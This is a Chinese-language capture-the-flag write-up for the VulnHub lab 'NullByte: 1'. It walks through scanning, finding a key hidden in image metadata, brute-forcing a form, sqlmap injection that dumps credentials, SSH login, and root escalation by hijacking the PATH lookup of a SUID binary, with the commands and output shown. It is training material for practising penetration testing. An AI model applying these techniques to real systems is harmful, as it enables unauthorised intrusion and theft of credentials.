# NullByte: 1

2024-6-9 https://www.vulnhub.com/entry/nullbyte-1,126/

difficulty: Basic to intermediate

## IP

192.168.5.32

## Scan

Open Port -> 80,111,777,37492

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37492/tcp   status
|   100024  1          41725/udp6  status
|   100024  1          46267/udp   status
|_  100024  1          56438/tcp6  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 163013d9d55536e81bb7d9ba552fd744 (DSA)
|   2048 29aa7d2e608ba6a1c2bd7cc8bd3cf4f2 (RSA)
|   256 6006e3648f8a6fa7745a8b3fe1249396 (ECDSA)
|_  256 bcf7448d796a194876a3e24492dc13a2 (ED25519)
37492/tcp open  status  1 (RPC #100024)
```

重点看 80web 服务吧，首页没内容，源码也没提示，使用 gobuster 进行扫描:

```
gobuster -t 32 dir -u http://192.168.5.32/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,zip -e

http://192.168.5.32/uploads
http://192.168.5.32/phpmyadmin
```

phpmyadmin 没有用户名和密码，暂时不能登陆，uploads 提示：Directory listing not allowed here.

探测下是否有隐藏的上传参数：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.32/uploads?FUZZ=/etc/passwd -fs 2309
```

没找到。

在观察首页上，有一个类似眼睛的图片，看看能否是有图片隐写：

```
exiftool main.gif

Comment: P-): kzMb5nVYJw
```

kzMb5nVYJw 像是个密码或者是个 url 目录，访问 http://192.168.5.32/kzMb5nVYJw/ 出现了一个输入 key 的窗口，查看下 html 的源码提示： this form isn't connected to mysql, password ain't that complex。根据提示应该是个固定的简单密码，尝试用 hydra + 密码字典进行爆破。

找到 key 为 elite, 输入后，显示了一个 username 搜索的页面，链接为 http://192.168.5.32/kzMb5nVYJw/420search.php?usrtosearch=ramses" 报错， usrtosearch 处可能存在 sql 注入，使用 sqlmap 进行扫描：

```
sqlmap -u 'http://192.168.5.32/kzMb5nVYJw/420search.php?usrtosearch=ramses' --batch --dbs

[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth

sqlmap -u 'http://192.168.5.32/kzMb5nVYJw/420search.php?usrtosearch=ramses' --batch -D seth -T users --dump

----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
```

看看能不能找到 YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE 是 base64，转码后为 c6d6bd7ebf806f43c76acc3681703b81 对应的明文密码 omega 尝试用此凭据，登陆 ssh

ramses:omega 能够成功登陆 ssh。查看 .bash_history 中有一些历史操作提示：

```
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
```

procwatch 是 suid 程序。

执行后显示：

```
  PID TTY          TIME CMD
20866 pts/0    00:00:00 procwatch
20867 pts/0    00:00:00 sh
20868 pts/0    00:00:00 ps
```

应该是调用的系统 ps 命令并且没有用绝对路径,进行利用：

```
ramses@NullByte:/var/www/backup$ echo '/bin/sh' > ps    # 这里如果使用/bin/bash 不能得到root权限，不知道是什么原因必须用/bin/sh
ramses@NullByte:/var/www/backup$ chmod +x ps
ramses@NullByte:/var/www/backup$ ./procwatch
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)

# cat proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```
